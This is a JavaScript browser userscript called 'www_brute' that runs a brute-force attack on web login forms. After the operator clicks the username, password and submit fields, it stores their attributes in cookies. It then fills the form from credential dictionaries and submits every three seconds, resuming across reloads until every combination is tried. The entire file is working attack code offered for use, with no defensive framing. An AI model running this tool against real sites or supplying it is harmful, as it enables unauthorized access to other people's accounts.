// ==UserScript==
// @name        www_brute
// @namespace   www_brute
// @version     1
// @grant       none
// ==/UserScript==

var BRUTE_INTERVAL_MS = 3000
var user_field, pass_field, submit_field, brute_offset

function init()
{
	console.info('[!] click on ' + ((user_field) ? '' : '<user> ') + ((pass_field) ? '' : '<pass> ') + ((submit_field) ? '' : '<submit> ') + 'fields' )
	document.getElementsByTagName('body')[0].addEventListener('click', function (e) {
  	if(! user_field )
		{
		  user_field = save_element( e.target, 'user' )
			console.log('[*] select <user> field ' + user_field)
		}
		else if(! pass_field )
		{
			pass_field = save_element( e.target, 'pass' )
			console.log('[*] select <pass> field ' + pass_field)
		}
		else if(! submit_field)
		{
			submit_field = save_element( e.target, 'submit' )
			console.log('[*] select <submit> field ' + submit_field)
		}
	} )
}

function reset()
{
	console.log('[*] reset')
	delete_cookie( '__user=' + get_cookie('__user=') )
	delete_cookie( '__pass=' + get_cookie('__pass=') )
	delete_cookie( '__submit=' + get_cookie('__submit=') )
	delete_cookie( '__offset=' + get_cookie('__offset=') )
}

function save_cookie(cookie) 
{ 
	document.cookie = cookie 
}

function get_cookie(cookie_name)
{
	var begin, end, value
	if( ( begin = document.cookie.indexOf(cookie_name) ) != -1 )
	{
		end = document.cookie.slice(begin).indexOf(';')
		value = (end != -1) ? document.cookie.slice( begin + cookie_name.length, begin+end ) : document.cookie.slice( begin + cookie_name.length )
		return value
	}
}

function delete_cookie(cookie)
{
	document.cookie = cookie + ";expires=Thu, 01 Jan 1970 00:00:01 GMT"
}

function serialize(element)
{
	var serialize_element = []
	for( var i = 0; i < element.attributes.length; i++ )
		serialize_element.push( element.attributes[i].nodeName + ':' + escape(element.attributes[i].nodeValue) )
	return serialize_element.join(',')
}

function deserialize(string)
{
	var elem = {}
	if(string)
	{
		string.split(',').map( function(attr_val) { elem[ attr_val.split(':')[0] ] = unescape( attr_val.split(':')[1] ) } )
		return elem
	}
}

function save_element(element, type)
{
	switch(type)
	{
		case 'user':
			save_cookie( '__user=' + serialize(element) )
			break
		case 'pass':
			save_cookie( '__pass=' + serialize(element) )
			break
		case 'submit':
			save_cookie( '__submit=' + serialize(element) )
			break
	}
	return element
}


var similar_elements
function similar_element(where, what)
{
	var elem
	similar_elements = []
	elem = search_element(where, what)
	if(elem)
		return elem

	var max_matches = 0
	for( var i = 0; i < similar_elements.length; i++ )
	{
		if( similar_elements[i].matches > max_matches )
		{
			max_matches = similar_elements[i].matches
			elem = similar_elements[i].elem
		}
	}
	if(elem)
		return elem
}


function search_element(where, what)
{
	for(var i = 0; i < where.children.length; i++)
	{
		var elem = where.children[i], is_found = true, matches = 0
		for(var attr in what)
		{
			if( elem.getAttribute( attr ) == what[attr] )
				matches++
			else
				is_found = false
		}		
		if(is_found && matches)
			break
		
		if(matches)
			similar_elements.push( { elem: elem, matches: matches } )
		if( elem = search_element(elem, what) )
			return elem
	}
	if(is_found)
		return elem
}


/*
function search_input(what)
{
	var forms = document.getElementsByTagName('form')
	for( var i = 0; i < forms.length; i++ )
	{
		var inputs = forms[i].getElementsByTagName('input')
		for( var j = 0; j < inputs.length; j++ )
		{
			var input = inputs[j], is_found = true, matches = 0
			for(var attr in what)
			{
				if( input.getAttribute( attr ) == what[attr] )
					matches++
				else
					is_found = false
			}
			if(is_found && matches)
				return input
		}
	}
 	return false
}
*/

function get_element(type)
{
	switch(type)
	{
		case 'user':
			return similar_element( document.body, deserialize( get_cookie( '__user=' ) ) )
		case 'pass':
			return similar_element( document.body, deserialize( get_cookie( '__pass=' ) ) )
		case 'submit':
			return similar_element( document.body, deserialize( get_cookie( '__submit=' ) ) )
	}
}

function send()
{
	save_cookie( '__offset=' + (++brute_offset) )
	submit_field.click()
}

function is_allow(dict)
{
	for( var loc = 0; loc < window.__brute[dict].allow.length; loc++ )
		if(! window.__brute[dict].allow[loc].test( location.host ) )
			return false
	for( var loc = 0; loc < window.__brute[dict].deny.length; loc++ )
		if( window.__brute[dict].deny[loc].test( location.host ) )
			return false
	return true
}

function do_brute(intr)
{
	if( brute_offset == undefined )
	{
		save_cookie('__offset=0')
		brute_offset = 0
	}
	else
		brute_offset = parseInt(brute_offset)
	var offset = 0

	for( var dict = 0; dict < window.__brute.length; dict++ )
	{
		if(! is_allow(dict) )
			continue
		for( var i = 0; i < window.__brute[dict].combo.length; i++ )
		{
			if( brute_offset == offset )
			{
				user_field.value = window.__brute[dict].combo[i][0]
				pass_field.value = window.__brute[dict].combo[i][1]
				send()
				return
			}
			offset++
		}

		if( window.__brute[dict].users && window.__brute[dict].passwords )
		{
			for(var i = 0; i < window.__brute[dict].passwords.length; i++)
			{
				for(var j = 0; j < window.__brute[dict].users.length; j++)
				{
					if( brute_offset == offset )
					{
						user_field.value = window.__brute[dict].users[j]
						pass_field.value = window.__brute[dict].passwords[i]
						send()
						return
					}
					offset++
				}
			}
		}
	}

	console.info('[*] brute force attack was finished')
	clearInterval(intr)
	return false
}

function in_url(what)
{
	return (location.search.indexOf(what) == -1) ? false : true
}

	
function brute()
{	
	if( in_url('__reset') )
	{
		reset()
		return
	}
	brute_offset = get_cookie('__offset=')
	if( ( brute_offset != undefined || in_url('__init') ) )
	{
		function get_userpass_fields()
		{
			user_field = get_element('user')
			pass_field = get_element('pass')
			submit_field = get_element('submit')
			if(user_field && pass_field && submit_field)
				intr = setInterval( function() { do_brute(intr) }, BRUTE_INTERVAL_MS )
			else
				setTimeout(get_userpass_fields, 1000)
		}
		get_userpass_fields()
	}
	if( in_url('__init') )
	{
		init()
		return
	}
}

try
{
	console.info('[*] www_brute v0.13')
	brute()
}
catch(exc)
{ 
	console.error(exc)
}